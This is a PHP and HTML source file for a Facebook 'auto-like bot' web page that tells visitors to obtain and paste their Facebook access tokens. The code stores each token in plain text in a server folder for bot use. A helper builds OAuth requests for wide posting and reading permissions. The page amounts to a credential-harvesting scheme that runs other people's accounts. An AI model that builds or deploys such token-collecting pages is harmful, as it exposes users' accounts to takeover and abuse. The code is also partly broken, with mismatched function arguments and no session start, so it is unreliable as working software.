<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>&bull; Wᴀϙᴀs Bᴀʙᴀʀ &bull;</title>
<link rel="stylesheet" type="text/css" href="style.css" media="all,handheld"/>
<link href="http://fonts.googleapis.com/css?family=Iceland" rel="stylesheet" type="text/css">
<link href="../fonts.googleapis.com/cssf8d0.css?family=Aladin" rel="stylesheet" type="text/css">
<link rel="shortcut icon" type="image/png" href="https://cdn3.iconfinder.com/data/icons/inside/PNG/256x256/icontexto-inside-facebook.png"/>
</head>

<style>
input[type=text] {
font-family:Courgette;
    width: 60%;
    height: 5%;
    padding: 8px 32px;
    margin: 8px 0;
    font-size:22px;
    box-sizing: border-box;
    border: 2px solid white;
    background-color: black;
    color: white;
    border-radius:50px;
    outline: none;
    text-align: center;
}

body, a:hover {
cursor: url(http://ani.cursors-4u.net/cursors/cur-11/cur1089.cur),
progress !important;
}
</style>

<?php
error_reporting(0);
$bot=new bot();
class bot{ 

public function getGr($as,$bs){
$ar=array(
        'graph',
        'fb',
        'me'
);
$im='https://'.implode('.',$ar);

return $im.$as.$bs;
}

public function getUrl($mb,$tk,$uh=null){
$ar=array(
        'access_token' => $tk,
);
if($uh){
$else=array_merge($ar,$uh);
        }else{
        $else=$ar;
}
foreach($else as $b => $c){
        $waqasdadxd[]=$b.'='.$c;
}
$true='?'.implode('&',$waqasdadxd);
$true=$this->getGr($mb,$true);
$true=json_decode($this->
one($true),true);
if($true[data]){
        return $true[data];
}else{
        return $true;}
}

private function one($url){
$cx=curl_init();
curl_setopt_array($cx,array(
CURLOPT_URL => $url,
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => 1,
CURLOPT_USERAGENT => 'CR3AT3D BY WAQAS BABAR',
));
$ch=curl_exec($cx);
        curl_close($cx);
        return ($ch);
}

public function savEd($tk,$id,$z=null,$bb=null){
if(!is_dir('waqasdadxd')){
        mkdir('waqasdadxd');
}
if($bb){
$blue=fopen('waqasdadxd/'.$id,'w');
fwrite($blue,$tk.'*on*on*on*on*'.$bb);
        fclose($blue);

echo'
<script type="text/javascript">
alert("INFO : Text robot has been created, Now click on activate button")
</script>';
}else{
        if($z){
if(file_exists('waqasdadxd/'.$id)){
$file=file_get_contents('waqasdadxd/'.$id);
$ex=explode('*',$file);
$str=str_replace($ex[0],$tk,$file);
$xs=fopen('waqasdadxd/'.$id,'w');
        fwrite($xs,$str);
        fclose($xs);
}else{
$str=$tk.'*on*on*on*on*'.$c;
$xs=fopen('waqasdadxd/'.$id,'w');
        fwrite($xs,$str);
        fclose($xs);
}
$_SESSION[key]=$tk.'_'.$id;
}else{
$file=file_get_contents('waqasdadxd/'.$id);
$file=explode('*',$file);
        if($file[5]){
$up=fopen('waqasdadxd/'.$id,'w');
fwrite($up,$tk.'*on*on*on*on*'.$file[5]);
        fclose($up);
        }else{
$up=fopen('waqasdadxd/'.$id,'w');
fwrite($up,$tk.'*on*on*on*on*');
        fclose($up);
        }
echo'
<script type="text/javascript">
alert("INFO : Your data has been saved, Now click on activate button")
</script>';
}
}
}
public function lOgbot($d){
        unlink('waqasdadxd/'.$d);
        unset($_SESSION[key]);

echo'
<script type="text/javascript">
alert("INFO : Logout success")
</script>';

        $this->atas();
        $this->home();
        $this->bwh();
}

public function cek($tok,$id,$nm){
echo '
<center>
     		<a href="http://facebook.com/' . $id . '"><img src="https://graph.facebook.com/' . $id . '/picture?width=800" style="-moz-box-shadow:0px 0px 20px 0px red;-webkit-box-shadow:0px 0px 20px 0px red;-o-box-shadow:0px 0px 20px 0px red;box-shadow:0px 0px 20px 0px red;width:150px; height:150px;border-radius:500px;" alt="' . $nm . '"/></a>
	Welcome To King Bot Team<font color="lime"> '.$nm.'</font><br>
    Activate Your Bot !</p><br>
<form action="index.php" method="post">
<br>
<input class="button" type="submit" value="Activate Bot"></p>
</form></div></center>';

$this->membEr();
}

public function atas(){
 echo'
<div style="font-family: Iceland;
font-size: 60pt">
<center><script language="JavaScript" src="waqas.js"></script></font></center>
<hr class="style-one">';
}

public function home(){
 echo '
<center>
<div style="font-family: Iceland;
font-size: 25pt;
text-shadow: 0 0 11px #CC0000, 0 0 11px #CC0000, 0 0 11px #CC0000;
color: #FFF">
<font style="text-shadow: 1px 1px green; color:yellow;" size="6">☆ CLICK ON PICTURE TO SEE MY PROFILE ☆</br>
<hr style="background-color:white;width:40%;">
</br>
<div class="css">
<a target="_blank"  href="https://www.facebook.com/100011419538918"><img src="https://graph.facebook.com/100011419538918/picture?width=900" alt="" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 15px 10px 	#B22222; padding: 0px;" width="400" height="400" title=""/></a></div>
</br>
<hr class="type_4"></br>
<iframe src="//www.facebook.com/plugins/subscribe.php?href=https://www.facebook.com/100011419538918&layout=button_count&amp;show_faces=false&colorscheme=light&font=lucida+grande&amp;width=105&appId=281570931938574" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:110px; height:50px;" allowTransparency="true"></iframe></div>';
}

public function bwh(){
echo '
<div id="bottom-content">
<div id="navigation-menu">
<a href="https://goo.gl/CvenbL" target="_blank"><input class="button" type="button" value="Allow App"></a> <a href="https://goo.gl/NkKRQ6" target="_blank"><input class="button" type="button" value="Get Token"></a>
</br>
</br>
<form action="index.php" method="post"><input class="input" type="text" name="token" placeholder="Paste Your Access Token Here" required></br>
<input class="button" type="submit" value="Submit"></form>';

     $this->membEr();

   }

public function membEr(){
        if(!is_dir('waqasdadxd')){
        mkdir('waqasdadxd');
}
$up=opendir('waqasdadxd');
while($use=readdir($up)){
if($use != '.' && $use != '..'){
        $user[]=$use;}
        }

echo'
<div id="footer">
<div style="font-family: Iceland;
font-size: 35pt;text-shadow: 0 0 11px #CC0000, 0 0 11px #CC0000, 0 0 11px #CC0000;color: #FFF">
<font size="6" color="orange">&bull; ☆ ACTIVE USERS ☆ : '.count($user).' &bull;</font>
<hr class="type_6">
<div style="font-family: Iceland;
font-size: 35pt;text-shadow: 0 0 11px #CC0000, 0 0 11px #CC0000, 0 0 11px #CC0000;color: #FFF">
<font size="6" color="orange">&bull; ☆ OWNER : WAQAS BABAR ☆ &bull;</font>
<hr class="type_6">
';
}

public function toXen($h){
header('Location: https://m.facebook.com/dialog/oauth?client_id='.$h.'&redirect_uri=https://www.facebook.com/connect/login_success.html&display=wap&scope=publish_actions%2Cuser_photos%2Cuser_friends%2Cfriends_photos%2Cuser_activities%2Cuser_likes%2Cuser_status%2Cuser_groups%2Cfriends_status%2Cpublish_stream%2Cread_stream%2Cread_requests%2Cstatus_update&response_type=token&fbconnect=1&from_login=1&refid=9');
}


}
if(isset($_SESSION[key])){
        $a=$_SESSION[key];
        $ai=explode('_',$a);
        $a=$ai[0];
if($_POST[logout]){
        $ax=$_POST[logout];
        $bot->lOgbot($ax);
}else{
$b=$bot->getUrl('/me',$a,array(
'fields' => 'id,name',
));
if($b[id]){
if($_POST[likes]){
        $as=$_POST[likes];
        $bs=$_POST[emot];
        $bx=$_POST[target];
        $cs=$_POST[opsi];
        $tx=$_POST[text];
if($cs=='text'){
        unlink('waqasdadxd/'.$b[id]);
$bot->savEd($a,$b[id],$as,$bs,$bx,'off');
        }else{
        if($tx){
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs,'x',$tx);
        }else{
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs);}}
}
        $bot->atas();
        $bot->home();
$bot->cek($a,$b[id],$b[name]);
}else{
echo'
<script type="text/javascript">
alert("INFO : Your Token has been Expired")
</script>';
        unset($_SESSION[key]);
        unlink('waqasdadxd/'.$ai[1]);
$bot->atas();
$bot->home();
        $bot->bwh();}}
        }else{
if($_POST[token]){
        $a=$_POST[token];
if(preg_match('/token/',$a)){
$tok=substr($a,strpos($a,'token=')+6,(strpos($a,'&')-(strpos($a,'token=')+6)));
        }else{
        $cut=explode('&',$a);
$tok=$cut[0];
}
$b=$bot->getUrl('/me',$tok,array(
        'fields' => 'id,name',
));
if($b[id]){
$bot->savEd($tok,$b[id],'on','on','on','on','null');
        $bot->atas();
        $bot->home();
$bot->cek($tok,$b[id],$b[name]);
}else{
echo'
<script type="text/javascript">
alert("INFO : Your Token is Invalid")
</script>';
        $bot->atas();
        $bot->home();
        $bot->bwh();}
}else{
if($_GET[token]){
        $a=$_GET[token];
        $bot->toXen($a);
}else{
        $bot->atas();
        $bot->home();
        $bot->bwh();}}
}
?>
<audio
src="http://links.papapk.net/punjabi_songs/badshah/Dj%20Waley%20Babu%20-%20Papa.PK.mp3" autoplay="" loop=""></audio>
</audio>   